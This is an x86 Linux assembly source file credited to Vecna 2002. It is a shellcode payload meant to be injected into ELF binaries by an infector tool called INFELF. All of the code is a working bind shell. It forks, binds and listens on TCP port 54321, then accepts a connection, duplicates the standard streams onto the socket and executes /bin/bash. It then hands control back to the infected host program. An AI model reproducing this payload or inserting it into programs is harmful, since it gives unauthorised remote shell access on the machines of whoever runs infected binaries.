;Remote Shellcode snippet for INFELF tool
;(c) Vecna 2002

BITS 32

%define jmps jmp short

%define dwo dword
%define wo  word
%define by  byte

%include "syscall.i"
%include "useful.i"

%define RSHELL_PORT 54321

db '$ORIGINAL_BYTES$'

_start:
;db 0cch
       pushad

       push by __NR_fork
       pop eax
       int 80h
       test eax,eax
       jnz near .finish

       sub esi,esi

       push by 6
       push by 1
       push by 2

       push by __NR_socketcall
       pop eax
       push by SYS_SOCKET
       pop ebx
       mov ecx,esp
       int 80h
       test eax,eax
       js .js2exit22
       mov ebp,eax

       push by __NR_socketcall
       pop eax
       mov ecx,esp
       int 80h
  .js2exit22:
       add esp,by 3*_Push
       test eax,eax
       js .js2exit
       mov edi,eax

       push esi
       push esi
       push esi
       mov eax,RSHELL_PORT
       xchg al,ah
       shl eax,16
       mov al, 2
       push eax
       mov eax,esp

       push by 16
       push eax
       push ebp

       push by __NR_socketcall
       pop eax
       push by SYS_BIND
       pop ebx
       mov ecx,esp
       int 80h
       test eax,eax
       jnz .jnz2exit2

       mov ecx,esp
       mov [ecx],edi
       mov eax,[ecx+4]
       inc byte [eax+3]
       push by __NR_socketcall
       pop eax
       int 80h
  .jnz2exit2:
       add esp, by 7*_Push
       test eax,eax
       jnz .jnz2exit

       push by 3
       push ebp

       push by __NR_socketcall
       pop eax
       push by SYS_LISTEN
       pop ebx
       mov ecx,esp
       int 80h

       push by 3
       push edi

       test eax,eax
       jnz .jnz2exit23

       push by __NR_socketcall
       pop eax
       mov ecx,esp
       int 80h

  .jnz2exit23:
       add esp, by 4*2
       test eax,eax
  .jnz2exit:
       jnz .exit

       push esi
       push esi
       push ebp

       push by __NR_socketcall
       pop eax
       push by SYS_ACCEPT
       pop ebx
       mov ecx,esp
       int 80h
       add esp, by 3*_Push
       test eax,eax
  .js2exit:
       js .exit

       mov ebx,ebp
       mov ebp,eax
       push by __NR_close
       pop eax
       int 80h

       push esi
       push esi
       push edi

       push by SYS_ACCEPT
       pop ebx
       push by __NR_socketcall
       pop eax
       mov ecx,esp
       int 80h
       pop ebx
       add esp, by 2*_Push
       test eax,eax
       js .exit
       mov edi, eax

       push by __NR_close
       pop eax
       int 80h

       xor ecx,ecx
       push by __NR_dup2
       mov ebx,ebp
       pop eax
       int 80h

       mov ebx,edi
       xor ecx,ecx
       inc ecx
       push by __NR_dup2
       pop eax
       int 80h

       xor ecx,ecx
       inc ecx
       inc ecx
       push by __NR_dup2
       pop eax
       int 80h

       push by "h"
       push dword "/bas"
       push dword "/bin"
       mov ebx,esp

       sub eax,eax
       push eax
       mov edx,esp
       push ebx
       mov ecx,esp

       push by __NR_execve
       pop eax
       int 80h

  .exit:
       mov ebx,ebp
       push by __NR_close
       pop eax
       int 80h

       mov ebx,edi
       push by __NR_close
       pop eax
       int 80h

  .finish:
       popad
       mov esp, 0aa55aa55h
